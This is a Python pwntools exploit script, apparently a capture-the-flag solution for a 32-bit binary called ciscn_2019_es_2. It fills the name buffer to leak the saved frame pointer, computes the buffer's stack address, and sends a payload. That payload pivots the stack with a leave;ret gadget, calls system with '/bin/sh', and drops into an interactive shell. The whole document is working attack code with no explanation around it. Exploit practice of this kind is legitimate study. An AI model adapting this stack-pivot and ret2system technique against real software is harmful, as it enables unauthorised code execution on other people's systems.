from pwn import * 
#context.log_level = 'debug'
io = process('./ciscn_2019_es_2')
#io = gdb.debug('./ciscn_2019_es_2','break *vul')
elf = ELF('./ciscn_2019_es_2')
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']

offset = 0x28
payload1 = b'A'*offset
io.sendafter(b"Welcome, my friend. What's your name?\n",payload1)
io.recvuntil(b'Hello,')
io.recvuntil(b'A'*0x28)
old_ebp = u32(io.recv(4))
s_addr = ebp_addr = old_ebp-0x10-offset
print('old_ebp',hex(old_ebp))
print('s_addr -> ',hex(ebp_addr))
#pause()
payload2 = p32(0)+p32(elf.plt['system'])+p32(0)+p32(s_addr+0x10)+b'/bin/sh\x00'
payload2 = payload2.ljust(0x28,b'A')
payload2 += p32(ebp_addr)+p32(0x08048562) 
io.send(payload2)
#pause()
io.interactive()

